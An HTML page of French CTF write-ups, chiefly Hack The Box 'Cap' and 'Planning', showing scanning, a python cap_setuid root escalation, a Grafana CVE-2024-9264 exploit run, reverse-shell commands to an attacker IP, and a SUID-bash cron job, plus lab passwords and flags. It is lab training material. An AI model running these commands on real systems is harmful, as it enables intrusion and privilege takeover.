<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fr3nch4Sec - Writeups CTF</title>
    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Hack:wght@400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style/style.css"> <!-- Chemin dans dossier style/ -->
    <!-- Highlight.js neutre -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css" id="highlight-theme">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <style>
        /* Styles pour accord√©on moderne (am√©lior√© pour √©viter clips) */
        .writeup-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.5s ease-out, padding 0.3s ease-out; /* Transition plus douce */
            padding: 0 15px;
        }
        .writeup-content.open {
            max-height: none; /* Pas de limite fixe pour √©viter coupures */
            overflow: visible; /* Visible complet quand ouvert */
            padding: 15px;
        }
        .clickable {
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            position: relative;
            user-select: none;
        }
        .clickable::after {
            content: '+';
            font-size: 1.5em;
            font-weight: bold;
            position: absolute;
            right: 0;
            transition: transform 0.3s ease;
        }
        .clickable.open::after {
            content: '‚àí';
            transform: rotate(180deg);
        }
        .clickable:hover {
            color: var(--accent-color, #4a7043);
        }
        /* Fix pour code blocks (anti-saccad√© et visibilit√© lignes shell) */
        .writeup-content pre {
            white-space: pre-wrap; /* Wrap lignes longues sans saccades */
            line-height: 1.4; /* Espacement uniforme pour lignes shell */
            margin: 15px 0 !important; /* Espace au-dessus/en-dessous pour √©viter chevauchement */
            overflow-x: auto;
            overflow-y: visible; /* Toutes les lignes visibles */
            display: block;
            width: 100%;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Hack', monospace;
            font-size: 0.9em; /* L√©g√®rement plus petit pour lisibilit√© */
        }
        .writeup-content code {
            line-height: 1.4; /* Uniformit√© */
            white-space: pre-wrap;
            margin: 0;
        }
        .writeup-content pre code {
            display: block;
            padding: 0;
            margin: 0;
            white-space: pre-wrap; /* Assure wrap dans Highlight.js */
        }
        /* √âvite chevauchement avec texte adjacent */
        .writeup-content h3, .writeup-content p {
            margin-bottom: 10px;
        }
        .writeup-content > *:first-child {
            margin-top: 0;
        }
    </style>
</head>
<body class="dark-mode">
    <button id="theme-toggle" aria-label="Basculer mode jour/nuit">
        <span class="theme-icon">üåô</span>
    </button>
    <h1>üìÇ Writeups CTF</h1>
    <p>Voici mes writeups organis√©s par plateforme :</p>
    <div class="writeup-list" id="writeupList">
        <!-- Section Hack The Box -->
        <div class="platform-section">
            <h2>Hack The Box</h2>
            <div class="writeup-item">
                <h2 class="clickable"> Cap Machine - Easy</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# HackTheBox - Cap Machine - Easy

1. **Reconnaissance**  
### Scan des ports  
Le Firewall de la machine bloque les scans basiques, avec transaction 'SynAck' compl√®te.  
J'utilise Naabu en premier avec Nmap sur chaque machine, car c'est super rapide.  
Donc, j'ai utilis√© le flag `-sS` dans Nmap, pour initier la connexion avec l'envoi de paquets. Si Nmap re√ßoit la r√©ponse, le port est consid√©r√© comme ouvert.  
```bash
sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v'
```
PORT   STATE SERVICE VERSION  
21/tcp open  ftp     vsftpd 3.0.3  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    gunicorn  

### Fuzzing de l'url avec Ffuf et Gobuster:  
```bash
ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1
```  
```bash
ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt
```  
#### R√©sultats obtenus:  
/ip  
/netstat  
/data  

### Ensuite:  
J'ai poursuivi la recherche de domaines et d'extensions potentielles.  
Apr√®s un fuzzing par r√©cursion, j'ai trouv√© une page √† '/data/0'.  
Cette page permet de t√©l√©charger un fichier PCAP, li√© √† l'utilisateur.  
Chose bizarre. La page √©tait li√©e au m√™me utilisateur mais les donn√©es pr√©sentes dans le PCAP diff√©raient l√©g√®rement.  
Pendant le fuzzing du domaine, le snapshot indiquait z√©ro en termes de paquets √† chaque type (TCP, UDP, etc.).  
J'ai t√©l√©charg√© les PCAP √† plusieurs reprises pour les comparer.  
Je les ai inspect√©s avec Wireshark sans r√©sultats. √Ä premi√®re vue en tout cas.  
J'ai trouv√© sur des forums, des docs et autres, comment filtrer les donn√©es. Car oui, je pratique peu Wireshark.  
J'ai donc lanc√© 'Protocol Hierarchy' sur le protocole FTP.  

En examinant les en-t√™tes, le mot de passe s'affiche directement. Et l'utilisateur, dans un paquet avec une IP li√©e √† celui contenant le mot de passe.  

<link href="style.css" rel="stylesheet" />
<style>
  img {
    width: 100%;
    max-width: 500px;
    height: auto;
  }
</style>
<img src="https://github.com/Fr3nch4Sec/fr3nch4.github.io/blob/main/images/Cap_img_1.webp" alt="Vue de Wireshark" />










                        
2. **Exploitation** :  
#### Connexion SSH avec id & password  
Je me suis servi de ce mot de passe afin de me connecter via SSH, avec l'utilisateur 'nathan'.  

```bash
ssh nathan@10.10.10.245
```  
On est dans la machine. üñ•Ô∏èüñ•Ô∏è  

J'ai t√©l√©charg√© Linpeas ü§î  

```bash
nathan@cap:~$ ls
e.py  linpeas  linpeas.sh  snap  user.txt
nathan@cap:~$ cat user.txt
d2ee7e0a3b896efed8eeeeab2aeb1ff6
nathan@cap:~/snap/bin$ ls
Makefile  cve  cve-2021-4034.c  esc  exploit_nss.py  ls polkit  pwnkit.c
```  
J'ai rendu Linpeas ex√©cutable, et l'ai lanc√©.  
```bash
chmod +x linpeas
chmod +x linpeas.sh
./linpeas
./linpeas.sh
```  
Linpeas a indiqu√© dans la sortie que Python 3 disposait de la fonction 'cap_setuid' qui peut modifier l'UID d'un processus:  
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`  
```bash
nathan@cap:~$ ls
snap user.txt
nathan@cap:~$ cat user.txt
bd615fdf252a03b75214aebaa4cb0714
```  

3. **Acc√®s root** : Escalade de privil√®ges via la cr√©ation d'un fichier SUID.  
J'ai cherch√© sur l'extension Hacktools, sur des writeups, pour trouver comment √©lever les privil√®ges depuis un 'user' Linux.  
J'en ai essay√© plusieurs:  
Cette commande m'a permis de passer de User √† Root.  

```bash
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```  
```bash
root@cap:~# ls
snap user.txt
root@cap:~# cd /root
root@cap:/root# ls
root.txt snap
root@cap:/root# cat root.txt
b17a06939691f0e4f924f37138c32eeb
root@cap:/root#
```  


<link href="style.css" rel="stylesheet" />
<style>
  img {
    width: 100%;
    max-width: 500px;
    height: auto;
  }
</style>
<img src="https://github.com/Fr3nch4Sec/fr3nch4.github.io/blob/main/images/Cap_img_2.webp" alt="√âlevation de privil√®ges" />














                        
                        
### Conclusion  
Une excellente machine pour apprendre les bases de l'√©num√©ration et de l'exploitation simple.
                    </script>
                </div>
                
            <div class="writeup-item">
                <h2 class="clickable"> Planning HTB</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
                    # HTB Planning

Write-up

L‚Äôintitul√© du CTF fourni des identifiants pour commencer.

id: admin

pwd: 0D5oT70Fq13EvB5r

# Reconnaissance

```bash
nmap -p- -sC -sV -O 10.10.11.68

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
```

## Scan des vuln√©rabilit√©s

```bash
nuclei -target http://planning.htb

[missing-sri] [http] [info] http://planning.htb ["https://code.jquery.com/jquery-3.4.1.min.js","https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"]
[external-service-interaction] [http] [info] http://planning.htb
[waf-detect:nginxgeneric] [http] [info] http://planning.htb
[ssh-sha1-hmac-algo] [javascript] [info] planning.htb:22
[ssh-server-enumeration] [javascript] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
[ssh-password-auth] [javascript] [info] planning.htb:22
[ssh-auth-methods] [javascript] [info] planning.htb:22 ["["publickey","password"]"]
[openssh-detect] [tcp] [info] planning.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11"]
[form-detection] [http] [info] http://planning.htb
[nginx-version] [http] [info] http://planning.htb ["nginx/1.24.0"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://planning.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://planning.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://planning.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://planning.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://planning.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://planning.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://planning.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://planning.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://planning.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://planning.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://planning.htb
[tech-detect:nginx] [http] [info] http://planning.htb
[tech-detect:owl-carousel] [http] [info] http://planning.htb
[caa-fingerprint] [dns] [info] planning.htb
[INF] Scan completed in 1m. 24 matches found.
```

## Fuzzing

```bash
$ ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' -u  http://10.10.11.68 -fc 301

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 93ms]
```

```bash
curl --path-as-is -i "http://grafana.planning.htb/public/build/datasource/../../../../../../../../etc/passwd"
```

```bash
$ curl -i "http://grafana.planning.htb/"

HTTP/1.1 302 Found
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 21 Sep 2025 22:11:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 29
Connection: keep-alive
Cache-Control: no-store
Location: /login
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block

<a href="/login">Found</a>.
```

Cette commande permet de trouver la version de Grafana.

```bash
$ curl -s "http://grafana.planning.htb/login" | grep -i version
                           
"version":"11.0.0" et "Grafana v11.0.0 (83b9528bce)"
```

```bash
$ gobuster dir -u http://grafana.planning.htb -w directory-list-2.3-medium.txt -x php,js,txt --exclude-length 29

/login                (Status: 200) [Size: 38241]
/signup               (Status: 200) [Size: 38241]
/public               (Status: 302) [Size: 31] [--> /public/]
/admin                (Status: 302) [Size: 24] [--> /]
/plugins              (Status: 302) [Size: 24] [--> /]
/api.php              (Status: 401) [Size: 102]
/api.js               (Status: 401) [Size: 102]
/api                  (Status: 401) [Size: 102]
/api.txt              (Status: 401) [Size: 102]
/robots.txt           (Status: 200) [Size: 26]
```

# Exploitation

J'ai trouv√© une faille pour Grafana version 11.

Ce repository fourni un exploit Python pour la https://github.com/nollium/CVE-2024-9264.git

Donc je l‚Äôai lanc√© avec les creds initiaux, pour acc√©der √† la base de donn√©es.

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb:80
 
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

```bash
‚îå‚îÄ‚îÄ(.venv)‚îÄ(kali„âøkali)-[~/Documents/htb/Planning/CVE-2024-9264]
‚îî‚îÄ$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: cat /home/grafana/user.txt
[-] Unexpected response format:
[-] {
    "results": {
        "B": {
            "error": "exit status 1IO Error: Pipe process exited with non-zero exit 
code=\"1\": cat /home/grafana/user.txt >/tmp/grafana_cmd_output 2>&1 |\n",
            "errorSource": "",
            "status": 500,
            "frames": []
        }
    }
}
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
cat: /home/grafana/user.txt: No such file or directory
                                                                                             
‚îå‚îÄ‚îÄ(.venv)‚îÄ(kali„âøkali)-[~/Documents/htb/Planning/CVE-2024-9264]
‚îî‚îÄ$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1" http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1
[-] Unexpected response format:
[-] {
    "results": {
        "B": {
            "error": "exit status 1sh: 1: Syntax error: Bad fd number\nIO Error: Pipe process
exited with non-zero exit code=\"2\": bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1 
>/tmp/grafana_cmd_output 2>&1 |\n",
            "errorSource": "",
            "status": 500,
            "frames": []
        }
    }
}
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
cat: /home/grafana/user.txt: No such file or directory
```

```bash
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/flag.txt http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /home/grafana/flag.txt
[-] File not found
                                                                                             
‚îå‚îÄ‚îÄ(.venv)‚îÄ(kali„âøkali)-[~/Documents/htb/Planning/CVE-2024-9264]
‚îî‚îÄ$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /home/grafana/pass.txt http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /home/grafana/pass.txt
[-] File not found
```

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "nc -e /bin/sh 10.10.15.17 4444" http://grafana.planning.htb
```

```bash
$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /proc/1/environ http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /proc/1/environ
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/proc/1/environ'):
```

```bash
$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "env" http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: env
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('env >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
SHLVL=0
AWS_AUTH_EXTERNAL_ID=
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana

```

Cr√©ation d‚Äôun environnement dans le container Docker, qui me permet d‚Äôobtenir le mot de passe du user **enzo** *RioTecRANDEntANT*

## Connexion SSH

Avec le password trouv√© pr√©c√©demment.

```bash
$ ssh enzo@10.10.11.68     
The authenticity of host '10.10.11.68 (10.10.11.68)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.68' (ED25519) to the list of known hosts.
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

Last login: Sun Sep 21 23:57:11 2025 from 10.10.15.17
enzo@planning:~$ 
```

```bash
enzo@planning:~$ netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*              	 			LISTEN      -                   
tcp        0      0 127.0.0.1:38283         0.0.0.0:*               			LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               			LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               				LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               				LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               			LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               				LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               			LISTEN      -                   
tcp6       0      0 :::22                   :::*                    						LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           			-                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                          			-         
```

Le port 8000 semble √™tre int√©ressant.

```bash
enzo@planning:/$ ls
bin@                boot/   dev/  home/  lib64@              lost+found/  mnt/  proc/  run/   sbin.usr-is-merged/  sys/  usr/
bin.usr-is-merged/  cdrom/  etc/  lib@   lib.usr-is-merged/  media/       opt/  root/  sbin@  srv/                 tmp/  var/
enzo@planning:/$ cd opt
enzo@planning:/opt$ ls
containerd  crontabs
enzo@planning:/opt$ cd containerd
enzo@planning:/opt/containerd$ ls
ls: cannot open directory '.': Permission denied
enzo@planning:/opt/containerd$ cd ..
enzo@planning:/opt$ ls
containerd  crontabs
enzo@planning:/opt$ cd crontabs
enzo@planning:/opt/crontabs$ ls
crontab.db  env.db
enzo@planning:/opt/crontabs$ cat env.db
enzo@planning:/opt/crontabs$ cat crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Le fichier crontab.db contenait le password ***P4ssw0rdS0pRi0T3c .***

J‚Äôai cr√©√© un tunnel SSH pour le crontab avec les identifiants du user Enzo.

```bash
ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
```

Je n‚Äôavais plus qu‚Äô√† acc√©der au crontab UI dans le navigateur √† l‚Äôadresse 127.0.0.1:8000 et me connecter avec les identifants.

```bash
root
P4ssw0rdS0pRi0T3c
```

Toujours dans l‚ÄôUI crontab, j‚Äôai ajouter un cronjob. 

```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

```bash
/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip 
/var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz
```

```bash
/root/scripts/cleanup.sh
```

D√©connexion puis reconnexion afin que les changements soient pris en compte.

```bash
enzo@planning:~$ /tmp/rootbash -p
rootbash-5.2# ls
user.txt
rootbash-5.2# cat user.txt
c2eccb774042d4ac3ff83c3c66b55250
rootbash-5.2# cd root
rootbash: cd: root: No such file or directory
rootbash-5.2# cd /root
rootbash-5.2# ls
root.txt  scripts
rootbash-5.2# cat root.txt
b7f38a74e151fbff1dc3a481ca59db70

rootbash-5.2# cd scripts
rootbash-5.2# ls
cleanup.sh  crontab.db  docker-compose.yml  Dockerfile
rootbash-5.2# cleanup.sh
```

# Conclusion

Cette box √©tait plut√¥t cool. J‚Äôai p√ª toucher un peu aux bases de donn√©es, √† Grafana.

J‚Äôai appris √† faire un tunnel SSH pour un acc√®s via un browser. C‚Äô√©tait pas √©vident cette partie.
                    
                    </script>
                </div>
            </div>
                
            </div>
            <div class="writeup-item">
                <h2 class="clickable">Machine Basique</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# HackTheBox - Machine Basique  
## Introduction  
Ce writeup d√©crit la r√©solution de la machine "Basique" sur HackTheBox. L'objectif √©tait de d√©couvrir les services expos√©s et d'exploiter une faille simple.  
## √âtapes  
1. **Scan initial** : Utilisation de `nmap` pour identifier les ports ouverts.  
```bash  
nmap -sC -sV -oA scan 10.10.10.10  
```  
2. **Exploitation** : D√©couverte d'une vuln√©rabilit√© dans un service web.  
3. **Acc√®s root** : Escalade de privil√®ges via un fichier de configuration mal s√©curis√©.  
## Conclusion  
Cette machine √©tait un excellent exercice pour les d√©butants en pentest.
                    </script>
                </div>
            </div>
        </div>
        <!-- Section TryHackMe -->
        <div class="platform-section">
            <h2>TryHackMe</h2>
            <div class="writeup-item">
                <h2 class="clickable">Machine Easy & Medium</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# TryHackMe - Machine Easy & Medium  
## Introduction  
Ce writeup couvre une machine TryHackMe combinant des √©l√©ments faciles et moyens, avec un focus sur l'√©num√©ration et l'exploitation web.  
## √âtapes  
1. **√ânum√©ration** : Scan des ports et services.  
```bash  
nmap -sV -sC 10.10.10.10  
```  
2. **Exploitation** : Vuln√©rabilit√© dans un CMS mal configur√©.  
3. **Post-exploitation** : Recherche de flags et escalade de privil√®ges.  
## Conclusion  
Un bon challenge pour consolider les bases du pentest.
                    </script>
                </div>
            </div>
        </div>
        <!-- Section Root-Me -->
        <div class="platform-section">
            <h2>Root-Me</h2>
            <div class="writeup-item">
                <h2 class="clickable">Challenge Forensic</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# Root-Me - Challenge Forensic  
## Introduction  
Ce challenge portait sur l'analyse d'une image m√©moire avec Volatility pour extraire des informations sensibles.  
## √âtapes  
1. **Analyse m√©moire** : Utilisation de Volatility pour lister les processus.  
```bash  
volatility -f memory.dump pslist  
```  
2. **Extraction** : R√©cup√©ration d'un mot de passe dans un dump m√©moire.  
3. **Validation** : Soumission du flag obtenu.  
## Conclusion  
Une bonne introduction √† l'analyse forensique avec Volatility.
                    </script>
                </div>
            </div>
        </div>
        <!-- Section FCSC -->
        <div class="platform-section">
            <h2>FCSC</h2>
            <div class="writeup-item">
                <h2 class="clickable">Cryptobro</h2>
                <div class="writeup-content">
                    <script type="text/markdown">
# FCSC 2025 - Cryptobro  
## Introduction  
Ce challenge combinait cryptographie et analyse forensique, avec un fichier `.npy` √† analyser.  
## √âtapes  
1. **Analyse du fichier** : Utilisation de NumPy pour charger le fichier `.npy`.  
```python  
import numpy as np  
data = np.load('challenge.npy')  
```  
2. **D√©codage** : Identification d'un message chiffr√© dans les donn√©es.  
3. **D√©cryptage** : Application d'une m√©thode de d√©chiffrement pour extraire le flag.  
## Conclusion  
Un challenge int√©ressant qui m√™le plusieurs disciplines.
                    </script>
                </div>
            </div>
        </div>
    </div>
    <a href="index.html" class="back-link">‚¨Ö Retour au portfolio</a>
    <script>
        // Config Marked pour highlight
        marked.setOptions({
          highlight: function(code, lang) {
            if (hljs.getLanguage(lang)) {
              return hljs.highlight(code, { language: lang }).value;
            }
            return hljs.highlightAuto(code).value;
          }
        });
        // Parsing Markdown et accord√©on
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('.writeup-item').forEach(item => {
                const contentDiv = item.querySelector('.writeup-content');
                const markdownScript = contentDiv.querySelector('script[type="text/markdown"]');
                if (markdownScript) {
                    contentDiv.innerHTML = marked.parse(markdownScript.textContent);
                    // Re-highlight apr√®s parsing pour appliquer styles fix√©s
                    hljs.highlightAll();
                }
                const title = item.querySelector('h2.clickable');
                title.addEventListener('click', () => {
                    const isOpen = contentDiv.classList.contains('open');
                    // Ferme les autres pour mode unique
                    document.querySelectorAll('.writeup-content.open').forEach(other => {
                        if (other !== contentDiv) {
                            other.classList.remove('open');
                            other.parentElement.querySelector('.clickable').classList.remove('open');
                        }
                    });
                    contentDiv.classList.toggle('open', !isOpen);
                    title.classList.toggle('open', !isOpen);
                    // Re-highlight si ouvert (pour visibilit√©)
                    if (!isOpen) {
                        setTimeout(() => hljs.highlightAll(), 100);
                    }
                });
            });
        });
        // Toggle th√®me (coh√©rent avec index)
        document.addEventListener('DOMContentLoaded', () => {
            const toggle = document.getElementById('theme-toggle');
            const icon = toggle.querySelector('.theme-icon');
            const highlightTheme = document.getElementById('highlight-theme');
            const isDark = localStorage.getItem('theme') === 'dark';
            if (isDark) {
                document.body.classList.add('dark-mode');
                document.body.classList.remove('light-mode');
                icon.textContent = '‚òÄÔ∏è';
                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
            } else {
                document.body.classList.add('light-mode');
                document.body.classList.remove('dark-mode');
                icon.textContent = 'üåô';
                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
            }
            toggle.addEventListener('click', () => {
                toggle.classList.add('clicked');
                setTimeout(() => toggle.classList.remove('clicked'), 300);
                document.body.classList.toggle('dark-mode');
                document.body.classList.toggle('light-mode');
                const isDarkNow = document.body.classList.contains('dark-mode');
                icon.textContent = isDarkNow ? '‚òÄÔ∏è' : 'üåô';
                highlightTheme.href = isDarkNow
                    ? 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css'
                    : 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
                localStorage.setItem('theme', isDarkNow ? 'dark' : 'light');
                // Re-highlight apr√®s changement th√®me
                setTimeout(() => hljs.highlightAll(), 100);
            });
        });
    </script>
</body>
</html>










